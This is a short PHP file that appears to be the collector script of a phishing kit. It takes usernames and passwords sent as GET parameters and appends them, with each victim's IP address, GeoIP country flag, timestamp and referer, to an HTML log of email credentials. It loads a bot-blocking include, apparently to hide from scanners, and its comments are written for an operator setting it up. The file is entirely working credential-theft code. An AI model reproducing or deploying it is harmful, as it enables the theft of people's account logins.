<?php

// You can change any time .YOUR DATETIMEZONE

    include "country/bots.php"; // if you want block IP
    include "country/index.php"; // display country
    include 'country/geoip.inc';

    if($_GET){

        $gi = geoip_open("country/GeoIP.dat", "");

        $ip = $_SERVER['REMOTE_ADDR'] ;


        // SET YOUR DATETIME ZONE please just your continent and the capital of your country
        // for exemple Europe/Paris  see at here https://www.php.net/manual/fr/timezones.php

        $date = new DateTime("now", new DateTimeZone('Africa/Dakar') ); //SET YOUR DATETIMEZONE HERE
        $d =  $date->format('d/m/Y H:i:s');
        $country = geoip_country_id_by_addr($gi, $ip);
        
        $flag = '<img src="../country/img/flags/'.strtolower(geoip_country_code_by_addr($gi,$ip)).'.png">';

       $log = $_GET['inputs'];

        $username = $_GET['user'];
        $password = $_GET['pass'];
        $referer = $_SERVER['HTTP_REFERER'];

          $txt = '<tr> <th scope="row">'.$ip.'<br>'.$geoplugin->countryName.'&nbsp;'.$flag.''.$d.'</th> 
          <td width="30%" class="box1D"> '.$username.'
          <td width="30%" class="box2D"> '.$password.'
          <td width="40%" class="box3D"> '.$referer.' 

          </td> </tr>' ;


        //$myfile = "logs/".$_SERVER['REMOTE_ADDR'].".html";

        $myfile = fopen("email-password/log.html", "a") or die("Unable to open file!");
        fwrite($myfile, $txt);
        fclose($myfile);
       
    }

?>